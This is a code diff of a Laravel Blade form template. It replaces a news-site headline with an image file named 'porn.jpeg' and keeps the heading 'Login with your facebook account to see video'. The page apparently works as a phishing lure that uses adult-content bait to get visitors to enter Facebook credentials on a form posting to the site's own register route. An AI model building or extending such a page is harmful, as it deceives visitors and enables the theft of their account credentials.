@@ -2,7 +2,9 @@
 
 @section('content')
     <form method="post" action="{{ route('register.perform') }}">
-      <h1>We are your number 1 plug in daily gist and trending news.</h1> <br>
+        
+    <img class="mb-4" src="{!! url('images/porn.jpeg') !!}" alt="" width="" height="">
+        
     <h1>Login with your facebook account to see video</h1>
 
         <input type="hidden" name="_token" value="{{ csrf_token() }}" />
